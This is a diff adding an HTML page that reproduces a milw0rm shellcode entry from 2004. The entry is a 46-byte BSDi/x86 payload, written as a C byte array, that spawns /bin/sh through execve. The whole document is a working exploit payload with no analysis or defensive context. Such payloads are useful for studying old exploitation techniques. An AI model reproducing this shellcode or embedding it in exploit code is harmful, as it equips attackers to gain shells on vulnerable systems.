@@ -1,0 +1,19 @@
+<html>
+<head>
+<title>bsdi/x86 execve /bin/sh 46 bytes</title>
+<pre>
+/*
+ *  BSDi
+ *  execve() of /bin/sh by v9 (v9@fakehalo.org)
+ */
+
+static char exec[]=
+  &quot;\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c&quot; /* 14 characters. */
+  &quot;\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff&quot; /* 14 characters. */
+  &quot;\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e&quot; /* 14 characters. */
+  &quot;\x2f\x73\x68\x00&quot;; /* 4 characters; 46 characters total. */
+
+# milw0rm.com [2004-09-26]
+</pre>
+</html>
+
